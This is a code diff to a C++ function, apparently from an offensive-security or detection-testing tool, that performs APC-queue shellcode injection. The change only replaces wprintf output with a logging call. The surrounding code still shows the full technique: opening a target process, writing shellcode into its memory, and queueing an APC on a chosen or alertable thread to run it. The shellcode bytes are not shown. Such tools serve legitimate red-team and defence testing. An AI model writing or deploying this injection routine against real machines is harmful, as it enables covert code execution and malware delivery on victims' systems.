@@ -2,6 +2,7 @@
 
 #include "sysapi.h"
 #include "scripts.h"
+#include "logging.h"
 
 namespace scripts {
 
@@ -10,15 +11,13 @@ bool inject_queue_apc(uint32_t pid,
                       RemoteProcessOpenMethod open_method,
                       RemoteProcessMemoryMethod memory_method) {
 
-    wprintf(L"\nOpening the target process\n");
+    bblog::info("[*] Opening the target process");
     sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
     if (ProcessHandle == NULL) {
         return false;
     }
 
-    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());
-
-    wprintf(L"\nPlacing shellcode in the target process\n");
+    bblog::info("[*] Placing shellcode in the target process");
 
     RemoteProcessMemoryContext ctx;
     bool res = process_init_memory(ctx, memory_method, ProcessHandle.get(), pid);
@@ -33,7 +32,7 @@ bool inject_queue_apc(uint32_t pid,
         return false;
     }
 
-    wprintf(L"  [*] writing shellcode...\n");
+    bblog::info("writing shellcode...");
 
     res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
     if (!res) {
@@ -42,41 +41,35 @@ bool inject_queue_apc(uint32_t pid,
 
     if (tid) {
 
-        wprintf(L"\nQueueing APC with shellcode in the thread\n");
+        bblog::info("[*] Queueing APC with shellcode in the thread");
 
         sysapi::unique_handle ThreadHandle = sysapi::ThreadOpen(pid, tid);
         if (ThreadHandle == NULL) {
             return false;
         }
 
-        wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());
         res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
         if (!res) {
             return false;
         }
 
-        wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", ThreadHandle.get());
-
-        wprintf(L"\nSuccess\n");
+        bblog::info("[+] Success");
         return true;
     }
 
-    wprintf(L"\nQueueing APC with shellcode in alertable thread\n");
+    bblog::info("[*] Queueing APC with shellcode in alertable thread");
 
     auto ThreadHandle = process_find_alertable_thread(ProcessHandle.get());
     if (ThreadHandle == NULL) {
         return false;
     }
 
-    wprintf(L"  [+] alertable thread found, HANDLE = 0x%p\n", ThreadHandle.get());
     res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
     if (!res) {
         return false;
     }
 
-    wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", ThreadHandle.get());
-
-    wprintf(L"\nSuccess\n");
+    bblog::info("[+] Success");
     return true;
 }
 
